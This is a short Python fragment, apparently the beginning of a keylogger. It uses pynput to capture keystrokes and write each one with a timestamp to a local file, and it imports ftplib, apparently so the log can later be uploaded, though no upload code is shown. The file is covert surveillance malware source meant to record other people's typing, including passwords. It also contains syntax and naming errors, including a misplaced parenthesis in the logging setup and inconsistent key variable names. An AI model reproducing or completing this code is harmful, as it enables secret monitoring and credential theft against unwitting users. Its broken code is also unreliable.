from pynput import Key, Listener
import ftplib 
import logging

#Directory where the output will be saved in, current directory
logdir = ""

#Configure logfile and how it is going to save the keylog event
logging.basicConfig(filename=logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s"

#Define what happend if the keys are pressed
#First log everything and make sure it is a string
# Stringify a key
# If they find a key
def pressing_key(Key):
	try:
		logging.info(str(Key))
	except AttributeError:
		print("A special key {0} has been pressed".format(key))
